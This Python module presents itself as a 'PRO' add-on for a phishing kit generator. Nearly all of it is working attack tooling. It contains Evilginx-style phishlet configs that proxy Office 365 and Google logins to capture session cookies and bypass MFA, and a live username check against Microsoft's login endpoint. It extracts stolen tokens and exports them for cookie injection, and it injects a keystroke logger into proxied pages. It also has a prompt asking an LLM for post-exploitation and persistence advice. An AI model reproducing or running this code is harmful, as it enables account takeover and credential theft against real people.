"""
Phishing Kit Generator PRO Enhancement Module
==============================================
AI credential validation, Evilginx-style MFA bypass, real-time MITM

This module extends phishing_kit_gen.py with PRO features.
"""

import re
import json
import asyncio
import hashlib
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from datetime import datetime
import requests


@dataclass
class HarvestedCredential:
    """Harvested credential structure"""
    username: str
    password: str
    platform: str
    timestamp: datetime
    mfa_token: Optional[str] = None
    session_cookie: Optional[str] = None
    validated: bool = False
    validation_result: Optional[Dict] = None


class AICredentialValidator:
    """AI-powered credential validation for phishing kits"""
    
    def __init__(self):
        try:
            from cybermodules.llm_engine import LLMEngine
            self.llm = LLMEngine(scan_id="phishing_cred_validator")
            self.has_ai = True
        except:
            self.llm = None
            self.has_ai = False
        
        self.validation_patterns = {
            "office365": {
                "username_regex": r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$",
                "password_min_length": 8,
                "validation_endpoint": "https://login.microsoftonline.com/common/GetCredentialType"
            },
            "google": {
                "username_regex": r"^[a-zA-Z0-9_.+-]+@gmail\.com$",
                "password_min_length": 8,
                "validation_endpoint": "https://accounts.google.com/_/signin/sl/lookup"
            },
            "linkedin": {
                "username_regex": r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$",
                "password_min_length": 6,
                "validation_endpoint": "https://www.linkedin.com/uas/authenticate"
            }
        }
    
    async def validate_credential(self, cred: HarvestedCredential, live_check: bool = True) -> Dict[str, Any]:
        """Validate harvested credential with AI and optional live check"""
        
        result = {
            "credential": cred.username,
            "platform": cred.platform,
            "valid_format": False,
            "live_validation": None,
            "ai_confidence": 0.0,
            "validation_time": datetime.now().isoformat(),
            "recommendations": []
        }
        
        # Step 1: Format validation
        pattern_config = self.validation_patterns.get(cred.platform, {})
        username_regex = pattern_config.get("username_regex", ".*")
        
        if re.match(username_regex, cred.username):
            result["valid_format"] = True
        else:
            result["recommendations"].append("Username format invalid")
            return result
        
        # Step 2: Live validation (optional, risky)
        if live_check:
            live_result = await self._live_credential_check(cred)
            result["live_validation"] = live_result
            
            if live_result.get("status") == "valid":
                result["ai_confidence"] = 0.95
                cred.validated = True
                cred.validation_result = result
            elif live_result.get("status") == "invalid":
                result["ai_confidence"] = 0.1
            else:
                result["ai_confidence"] = 0.5
        
        # Step 3: AI analysis
        if self.has_ai:
            ai_analysis = await self._ai_credential_analysis(cred)
            result["ai_analysis"] = ai_analysis
            result["recommendations"].extend(ai_analysis.get("recommendations", []))
        
        return result
    
    async def _live_credential_check(self, cred: HarvestedCredential) -> Dict[str, Any]:
        """Perform live credential validation (OPSEC risk!)"""
        
        # WARNING: This actually tests credentials against real services
        # Only use in authorized red team engagements
        
        platform_config = self.validation_patterns.get(cred.platform, {})
        endpoint = platform_config.get("validation_endpoint")
        
        if not endpoint:
            return {"status": "unknown", "error": "No validation endpoint"}
        
        try:
            # Office 365 example
            if cred.platform == "office365":
                payload = {
                    "username": cred.username,
                    "isOtherIdpSupported": True,
                    "checkPhones": False,
                    "isRemoteNGCSupported": True,
                    "isCookieBannerShown": False,
                    "isFidoSupported": True
                }
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Content-Type": "application/json"
                }
                
                response = requests.post(endpoint, json=payload, headers=headers, timeout=10)
                
                if response.status_code == 200:
                    data = response.json()
                    
                    # IfExistsResult: 0 = exists, 1 = doesn't exist
                    if data.get("IfExistsResult") == 0:
                        return {
                            "status": "valid_username",
                            "federation": data.get("Credentials", {}).get("FederationRedirectUrl"),
                            "throttle_status": data.get("ThrottleStatus")
                        }
                    else:
                        return {"status": "invalid_username"}
            
            # Google example
            elif cred.platform == "google":
                # Google has anti-automation, more complex
                return {"status": "unknown", "note": "Google validation requires browser automation"}
            
            # LinkedIn example
            elif cred.platform == "linkedin":
                # LinkedIn also requires session management
                return {"status": "unknown", "note": "LinkedIn validation requires CSRF token"}
            
            else:
                return {"status": "unknown", "platform": "not_supported"}
        
        except Exception as e:
            return {"status": "error", "error": str(e)}
    
    async def _ai_credential_analysis(self, cred: HarvestedCredential) -> Dict[str, Any]:
        """Use AI to analyze credential quality and provide recommendations"""
        
        prompt = f"""Analyze this harvested phishing credential:

Username: {cred.username}
Platform: {cred.platform}
Password length: {len(cred.password)}
Has MFA token: {cred.mfa_token is not None}
Has session cookie: {cred.session_cookie is not None}

Provide:
1. Likelihood this is a valid corporate account (0-100%)
2. Recommendations for post-exploitation
3. Persistence strategies
4. Additional data collection opportunities

Output as JSON: {{"likelihood": 85, "recommendations": [...], "persistence": [...], "collection": [...]}}"""
        
        try:
            response = self.llm.query(prompt)
            
            # Parse JSON response
            import json
            try:
                analysis = json.loads(response)
                return analysis
            except:
                return {
                    "likelihood": 50,
                    "recommendations": ["Manual analysis required"],
                    "persistence": [],
                    "collection": []
                }
        except Exception as e:
            return {"error": str(e)}
    
    def batch_validate_credentials(self, creds: List[HarvestedCredential], max_concurrent: int = 5) -> List[Dict]:
        """Batch validate multiple credentials"""
        
        async def validate_all():
            tasks = []
            for cred in creds[:max_concurrent]:  # Limit concurrency
                tasks.append(self.validate_credential(cred, live_check=False))
            
            results = await asyncio.gather(*tasks)
            return results
        
        return asyncio.run(validate_all())


class EvilginxMFABypass:
    """Evilginx-style MFA bypass via reverse proxy MITM"""
    
    def __init__(self):
        self.proxy_sessions = {}
        self.stolen_sessions = []
    
    def generate_proxy_config(self, target_platform: str, phishlet_domain: str) -> Dict[str, Any]:
        """Generate Evilginx-style phishlet configuration"""
        
        configs = {
            "office365": {
                "name": "Office 365 MFA Bypass",
                "author": "CyberGhost",
                "min_version": "3.0.0",
                "proxy_hosts": [
                    {
                        "phish_sub": "login",
                        "orig_sub": "login",
                        "domain": "microsoftonline.com",
                        "session": True,
                        "is_landing": True
                    },
                    {
                        "phish_sub": "www",
                        "orig_sub": "www",
                        "domain": "office.com",
                        "session": True,
                        "is_landing": False
                    }
                ],
                "sub_filters": [
                    {
                        "triggers_on": "microsoftonline.com",
                        "orig_sub": "login",
                        "domain": "microsoftonline.com",
                        "search": "login\\.microsoftonline\\.com",
                        "replace": f"login.{phishlet_domain}",
                        "mimes": ["text/html", "application/json"]
                    }
                ],
                "auth_tokens": [
                    {
                        "domain": ".office.com",
                        "keys": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"]
                    },
                    {
                        "domain": ".microsoftonline.com",
                        "keys": ["ESTSAUTH", "ESTSAUTHPERSISTENT"]
                    }
                ],
                "credentials": {
                    "username": {
                        "key": "login",
                        "search": "\"(username|login|email)\"\\s*:\\s*\"([^\"]+)\"",
                        "type": "post"
                    },
                    "password": {
                        "key": "passwd",
                        "search": "\"passwd\"\\s*:\\s*\"([^\"]+)\"",
                        "type": "post"
                    }
                }
            },
            "google": {
                "name": "Google MFA Bypass",
                "author": "CyberGhost",
                "min_version": "3.0.0",
                "proxy_hosts": [
                    {
                        "phish_sub": "accounts",
                        "orig_sub": "accounts",
                        "domain": "google.com",
                        "session": True,
                        "is_landing": True
                    }
                ],
                "auth_tokens": [
                    {
                        "domain": ".google.com",
                        "keys": ["SID", "HSID", "SSID", "APISID", "SAPISID"]
                    }
                ],
                "credentials": {
                    "username": {
                        "key": "identifier",
                        "search": "\"identifier\"\\s*:\\s*\"([^\"]+)\"",
                        "type": "post"
                    },
                    "password": {
                        "key": "password",
                        "search": "\"password\"\\s*:\\s*\"([^\"]+)\"",
                        "type": "post"
                    }
                }
            }
        }
        
        return configs.get(target_platform, {})
    
    def intercept_session(self, request_data: Dict[str, Any], response_data: Dict[str, Any]) -> Dict[str, Any]:
        """Intercept and steal session tokens during MFA flow"""
        
        session_id = hashlib.sha256(f"{request_data.get('timestamp', '')}".encode()).hexdigest()[:16]
        
        stolen_session = {
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "victim_ip": request_data.get("client_ip"),
            "user_agent": request_data.get("user_agent"),
            "credentials": {},
            "cookies": {},
            "mfa_completed": False,
            "session_tokens": []
        }
        
        # Extract credentials from POST data
        if "username" in request_data:
            stolen_session["credentials"]["username"] = request_data["username"]
        if "password" in request_data:
            stolen_session["credentials"]["password"] = request_data["password"]
        
        # Extract cookies from response
        if "set-cookie" in response_data.get("headers", {}):
            cookies = response_data["headers"]["set-cookie"]
            stolen_session["cookies"] = self._parse_cookies(cookies)
        
        # Check for MFA completion indicators
        if any(key in response_data.get("body", "") for key in ["access_token", "id_token", "session_token"]):
            stolen_session["mfa_completed"] = True
            stolen_session["session_tokens"] = self._extract_tokens(response_data["body"])
        
        self.proxy_sessions[session_id] = stolen_session
        self.stolen_sessions.append(stolen_session)
        
        return stolen_session
    
    def _parse_cookies(self, cookie_header: str) -> Dict[str, str]:
        """Parse Set-Cookie header"""
        cookies = {}
        for cookie in cookie_header.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
        return cookies
    
    def _extract_tokens(self, response_body: str) -> List[str]:
        """Extract session tokens from response"""
        tokens = []
        
        # Common token patterns
        patterns = [
            r'"access_token"\s*:\s*"([^"]+)"',
            r'"id_token"\s*:\s*"([^"]+)"',
            r'"refresh_token"\s*:\s*"([^"]+)"',
            r'"session_token"\s*:\s*"([^"]+)"'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response_body)
            tokens.extend(matches)
        
        return tokens
    
    def export_session_for_cookie_injection(self, session_id: str) -> Dict[str, Any]:
        """Export stolen session for cookie injection attacks"""
        
        session = self.proxy_sessions.get(session_id)
        if not session:
            return {"error": "Session not found"}
        
        return {
            "session_id": session_id,
            "cookies": session["cookies"],
            "tokens": session["session_tokens"],
            "mfa_bypassed": session["mfa_completed"],
            "injection_ready": len(session["cookies"]) > 0,
            "curl_command": self._generate_curl_command(session),
            "browser_extension_json": self._generate_cookie_json(session)
        }
    
    def _generate_curl_command(self, session: Dict) -> str:
        """Generate curl command with stolen cookies"""
        cookies = " ".join([f'-b "{k}={v}"' for k, v in session["cookies"].items()])
        return f'curl {cookies} https://target.com'
    
    def _generate_cookie_json(self, session: Dict) -> str:
        """Generate cookie JSON for browser extensions"""
        cookie_list = []
        for name, value in session["cookies"].items():
            cookie_list.append({
                "name": name,
                "value": value,
                "domain": ".target.com",
                "path": "/",
                "secure": True,
                "httpOnly": True
            })
        return json.dumps(cookie_list, indent=2)


class RealTimeMITMEngine:
    """Real-time MITM proxy for credential and token interception"""
    
    def __init__(self):
        self.active_sessions = {}
        self.intercepted_data = []
    
    async def start_mitm_proxy(self, target_domain: str, proxy_port: int = 8080) -> Dict[str, Any]:
        """Start MITM proxy server"""
        
        # This would integrate with mitmproxy or custom proxy
        config = {
            "target_domain": target_domain,
            "proxy_port": proxy_port,
            "ssl_intercept": True,
            "capture_post_data": True,
            "capture_cookies": True,
            "capture_tokens": True,
            "status": "running"
        }
        
        return config
    
    def inject_javascript_keylogger(self, html_content: str) -> str:
        """Inject JavaScript keylogger into proxied HTML"""
        
        keylogger_js = """
        <script>
        (function(){
            var keys = [];
            document.addEventListener('keypress', function(e) {
                keys.push({k:e.key, t:Date.now()});
                if(keys.length >= 10) {
                    fetch('/api/phish/log', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({keys: keys})
                    });
                    keys = [];
                }
            });
        })();
        </script>
        """
        
        # Inject before </body>
        if "</body>" in html_content:
            return html_content.replace("</body>", keylogger_js + "</body>")
        else:
            return html_content + keylogger_js


def get_pro_engines():
    """Get all PRO enhancement engines"""
    return {
        "ai_validator": AICredentialValidator(),
        "evilginx_mfa": EvilginxMFABypass(),
        "mitm_engine": RealTimeMITMEngine()
    }
